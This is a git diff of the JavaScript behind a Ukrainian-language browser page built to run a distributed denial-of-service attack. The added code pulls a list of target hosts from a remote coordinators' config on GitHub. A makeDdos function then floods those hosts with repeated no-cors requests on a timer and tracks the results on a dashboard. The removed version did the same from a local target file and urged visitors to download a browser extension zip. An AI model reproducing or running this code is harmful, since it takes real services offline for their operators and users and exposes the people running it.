@@ -1,182 +1,161 @@
-window.addEventListener("load", function () {
-	let ipApi = "http://ip-api.com/json/?fields=61439";
-	let conectionMsg = document.querySelector("#DataContainer");
-	let container = document.querySelector("#msgText");
-	let statsList = document.getElementById("dataWraper");
-	let startBtn = document.querySelector("#startAtackBtn");
-	let vpnBtn = document.querySelector("#btnVpn");
-	let proxyBtn = document.querySelector("#btnProxy");
-	let interval = 100;
-	let extantionLink = "extantion/extantion.zip";
-
-	drawConectionInfo();
-	function drawConectionInfo() {
-		fetch(ipApi)
-			.then(function (responce) {
-				return responce.json();
-			})
-			.then(function (data) {
-				let innerData = `<p class="ip data-text">ваш IP ${data.query}</p>
-				<p class="contry data-text">ваша країна ${data.country}</p>
-				<p class="city data-text">Ваше місто ${data.regionName}</p>
-				<p class="provider data-text">Ваш провайдер ${data.as}</p>`;
-				conectionMsg.innerHTML = innerData;
-			});
-		checkBrowser();
-	}
-	function checkBrowser() {
-		var browserName = (function (agent) {
-			switch (true) {
-				case agent.indexOf("edge") > -1:
-					return "MS Edge";
-				case agent.indexOf("edg/") > -1:
-					return "Edge ( chromium based)";
-				case agent.indexOf("opr") > -1 && !!window.opr:
-					return "Opera";
-				case agent.indexOf("chrome") > -1 && !!window.chrome:
-					return "Chrome";
-				case agent.indexOf("trident") > -1:
-					return "MS IE";
-				case agent.indexOf("firefox") > -1:
-					return "Mozilla Firefox";
-				case agent.indexOf("safari") > -1:
-					return "Safari";
-				default:
-					return "other";
-			}
-		})(window.navigator.userAgent.toLowerCase());
-		if (browserName !== "Chrome") {
-			container.classList.add("err");
-			container.parentNode.classList.remove("hide");
-			container.innerText = "покищо наш сайт коректно працює лише з браузером Google Chrome. Будь ласка встановіть браузер Google Chrome, також будьте уважні і скачуйте з офіційного сайту Google";
-		} else {
-			checkExtantion();
-		}
-	}
-	function checkExtantion() {
-		let isInstaledExtantion = document.body.dataset.extantion === "true";
-		if (isInstaledExtantion) {
-		} else {
-			container.classList.add("err");
-			container.parentNode.classList.remove("hide");
-			container.innerText =
-				"Для коректної роботи сайту необхідно встановити розширення для вашого браузеру, яке буде самостійно підключати вас до проксі або впн і буде автоматично вас перепідключати через певні проміжки часу";
-			let link = document.createElement("a");
-			link.className = "download-lnk";
-			link.setAttribute("href", extantionLink);
-			link.textContent = "Завантажити розширення до браузера";
-			container.appendChild(link);
-		}
-	}
-
-	startBtn.addEventListener("click", function () {
-		getTargets(sendQuery);
-	});
-	function getTargets(a) {
-		let targetLink = "js/targets.json";
-		let targets = [];
-		fetch(targetLink, {
-			method: "GET",
-			// mode: "no-cors",
+let ipApi = "http://ip-api.com/json/?fields=61439",
+	targetLink = "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json",
+	targets = [],
+	attacketTargets = [],
+	contry = "",
+	count = 5,
+	interval = 1000,
+	sucPercent = 0,
+	errPercent = 0,
+	waitPercent = 0,
+	lightModeBtn = document.getElementById("lightModeCheckBox"),
+	intervalRange = document.getElementById("interval"),
+	intervalText = document.getElementById("intervalText"),
+	counterRange = document.getElementById("targetCounter"),
+	counterText = document.getElementById("counterText"),
+	startBtn = document.getElementById("startAtackBtn"),
+	// statistic
+	listWraper = document.getElementById("dataWraper"),
+	diagram = document.getElementById("diagram"),
+	errCir = document.getElementById("errCir"),
+	waitCir = document.getElementById("waitCir"),
+	waitbar = document.getElementById("waitBar"),
+	waitText = document.getElementById("dataWait"),
+	errBar = document.getElementById("errBar"),
+	errText = document.getElementById("dataErr"),
+	sucCir = document.getElementById("sucCir"),
+	sucBar = document.getElementById("sucBar"),
+	sucText = document.getElementById("dataSuc");
+getTargets = function (a) {
+	fetch(targetLink)
+		.then((responce) => {
+			return responce.json();
 		})
-			.then(function (responce) {
+		.then((data) => {
+			data["jobs"].forEach((k, i) => {
+				try {
+					if (k.args.request.path) {
+						targets.push({ host: k.args.request.path, err: 0, suc: 0, count: 0, queryStatus: true });
+					}
+				} catch (err) {
+					console.log(err);
+				}
+			});
+			counterRange.setAttribute("max", targets.length);
+		})
+		.catch((err) => {
+			console.log(err);
+			alert("Невдалося завантажити цілі спробуйте пізніше");
+		});
+	a();
+};
+getTargets(getLocatioInfo);
+function getLocatioInfo() {
+	let locationContainer = document.getElementById("conectionInfo");
+	setInterval(() => {
+		fetch(ipApi)
+			.then((responce) => {
 				return responce.json();
 			})
-			.then(function (data) {
-				for (const key in data) {
-					targets.push(data[key]);
-				}
-				return a(targets);
+			.then((data) => {
+				locationContainer.innerHTML = `<p class="main-desc"> Ваша країна ${data.country}</p>
+			<p class="main-desc">Ваше місто ${data.city}</p>
+			<p class="main-desc">Ваш провайдер ${data.org}</p>
+			<p class="main-desc"> Ваша IP адреса ${data.query}</p>`;
 			})
-
-			.catch(function (err) {
+			.catch((err) => {
 				console.log(err);
-				alert("Помилка завантаження цілей");
+				alert("Неможливо отримати інформацію про ваше підключення");
 			});
-	}
-	function sendQuery(targets) {
-		let statsData = [];
-
-		targets.forEach(function (k) {
-			statsData.push({ host: k, querySum: 0, err: false, sucQuery: 0, errQuery: 0 });
-		});
-
-		setInterval(function () {
-			targets.forEach(function (k, i) {
-				statsData[i].querySum++;
-				fetch(k, {
-					method: "GET",
-					mode: "no-cors",
-					cache: "no-cache",
-					headers: { "Referrer-Policy": "no-referrer" },
-				})
-					.then(function (responce) {
-						statsData[i].err = false;
-						statsData[i].sucQuery++;
-					})
-					.catch(function (error) {
-						statsData[i].err = true;
-						statsData[i].errQuery++;
-					});
-			});
-		}, interval);
-		drawSatats(statsData);
-	}
-	function drawSatats(data) {
-		let drawSuc = document.querySelector("#dataSuc"),
-			sucBar = document.querySelector("#sucBar"),
-			sucCir = document.querySelector("#sucCir"),
-			drawWait = document.querySelector("#dataWait"),
-			waitCir = document.querySelector("#waitCir"),
-			waitBar = document.querySelector("#waitBar"),
-			drawErr = document.querySelector("#dataErr"),
-			errCir = document.querySelector("#errCir"),
-			errBar = document.querySelector("#errBar");
-		let mainQueries = 0,
-			mainErr = 0,
-			mainSuc = 0,
-			waitQuerys = 0;
-		setInterval(function () {
-			(errPersenatge = Math.floor((mainErr / mainQueries) * 100)), (sucPercentage = Math.floor((mainSuc / mainQueries) * 100)), (waitPercentage = Math.floor((waitQuerys / mainQueries) * 100));
-			waitQuerys = mainQueries - (mainErr + mainSuc);
-
-			let statsMarkUp = "";
-			data.forEach(function (a) {
-				let errStatus = "suc";
-				if (a.err === true) {
-					errStatus = "err";
-				}
-				statsMarkUp += `<li class="target-item ${errStatus}"><span class="data-link">${a.host}</span><span class="data-sum">${a.querySum}</span><span class="data-suc">${a.sucQuery}</span><span class="data-err">${a.errQuery}</span></li>`;
-				mainQueries += a.querySum;
-				mainErr += a.errQuery;
-				mainSuc += a.sucQuery;
-			});
-
-			statsList.innerHTML = statsMarkUp;
-			// draw main iformation
-			drawSuc.innerText = sucPercentage;
-			sucBar.style.width = sucPercentage + "%";
-			// cir
-			sucCir.style.stroke = "rgba(164, 255, 157, 0.541)";
-			sucCir.style.strokeDasharray = sucPercentage + " " + 100;
-			// cir wait
-			drawWait.innerText = waitPercentage;
-			waitCir.style.stroke = "rgba(193, 193, 193, 0.708)";
-			waitCir.style.strokeDasharray = waitPercentage + " " + 100;
-			waitCir.style.strokeDashoffset = "-" + sucPercentage - 0.2;
-			waitBar.style.width = waitPercentage + "%";
-			drawErr.innerText = errPersenatge;
-			// cirr err
-			errCir.style.stroke = "rgba(251, 163, 163, 0.564)";
-			errCir.style.strokeDasharray = errPersenatge + " " + 100;
-			errCir.style.strokeDashoffset = "-" + parseFloat(waitPercentage + sucPercentage + 0.4);
-			errBar.style.width = errPersenatge + "%";
-			console.log("-" + parseFloat(waitPercentage + sucPercentage - 0.2) + " " + waitPercentage + " " + sucPercentage);
-		}, 1000);
+	}, 5000);
+}
+counterRange.addEventListener("input", (e) => {
+	count = e.target.value;
+	counterText.textContent = count;
+	attacketTargets = [];
+	for (let i = 0; i < count; i++) {
+		attacketTargets.push(targets[i]);
 	}
 });
-let lightModeBtn = document.querySelector("#lightModeCheckBox");
+intervalRange.addEventListener("input", (e) => {
+	interval = e.target.value;
+	intervalText.textContent = interval;
+});
+startBtn.addEventListener("click", makeDdos);
+function makeDdos() {
+	setInterval(() => {
+		attacketTargets.forEach((k, i) => {
+			k.count++;
+			fetch(k.host, {
+				method: "GET",
+				mode: "no-cors",
+				cache: "no-cache",
+				headers: { "Referrer-Policy": "no-referrer" },
+			})
+				.then((responce) => {
+					k.suc++;
+				})
+				.catch((err) => {
+					k.queryStatus = false;
+					k.err++;
+					console.log(err);
+				});
+		});
+		drawStatistic();
+	}, interval);
+}
+function drawStatistic() {
+	diagram.setAttribute("viewBox", "0 0 " + diagram.clientWidth + " " + diagram.clientHeight);
+	let radius = sucCir.getBoundingClientRect().height / 2;
+	let circulance = 2 * Math.PI * radius;
+	setInterval(() => {
+		let itemsList = "",
+			mainErr = 0,
+			mainWait = 0,
+			mainSuc = 0,
+			mainQuer = 0;
+		attacketTargets.forEach((k) => {
+			let errStatus = "suc";
+			if (k.queryStatus !== true) {
+				errStatus = "err";
+			}
+			((itemsList += `<li class="target-item ${errStatus}">
+			<span class="data-link">${k.host}</span>
+			<span class="data-suc">${k.count}</span>
+			<span class="data-err">${k.suc}</span>
+			<span class="data-sum">${k.err}</v>
+		</li>`),
+			(mainErr = k.err + mainErr)),
+				(mainSuc = k.suc + mainSuc),
+				(mainQuer = k.count + mainQuer),
+				(mainWait = mainQuer - (mainSuc + mainErr));
+		});
+		listWraper.innerHTML = itemsList;
+		itemsList = "";
+		// draw list
 
-lightModeBtn.addEventListener("click", function () {
+		sucPercent = (mainSuc / mainQuer) * 100;
+		waitPercent = (mainWait / mainQuer) * 100;
+		errPercent = (mainErr / mainQuer) * 100;
+		sucBar.style.width = sucPercent + "%";
+		sucText.textContent = Math.round(sucPercent);
+		waitBar.style.width = waitPercent + "%";
+		waitText.textContent = Math.round(waitPercent);
+		errBar.style.width = errPercent + "%";
+		errText.textContent = Math.round(errPercent);
+		// draw diagram
+		diagram.setAttribute("viewBox", `0 0 ${diagram.clientWidth} ${diagram.clientHeight}`);
+		sucCir.style.strokeDasharray = (sucPercent * circulance) / 100 + ` ${circulance - (sucPercent * circulance) / 100}`;
+		sucCir.style.stroke = "rgb(161, 255, 172)";
+		waitCir.style.strokeDashoffset = "-" + (sucPercent * circulance) / 100;
+		waitCir.style.strokeDasharray = (waitPercent * circulance) / 100 + ` ${circulance - (waitPercent * circulance) / 100}`;
+		waitCir.style.stroke = "rgb(191, 191, 191)";
+
+		errCir.style.strokeDashoffset = -circulance + (errPercent * circulance) / 100;
+		errCir.style.strokeDasharray = (errPercent * circulance) / 100 + ` ${circulance - (errPercent * circulance) / 100}`;
+		errCir.style.stroke = "rgb(254, 113, 113)";
+	}, 1000);
+}
+lightModeBtn.addEventListener("click", () => {
 	document.body.classList.toggle("dark");
 });
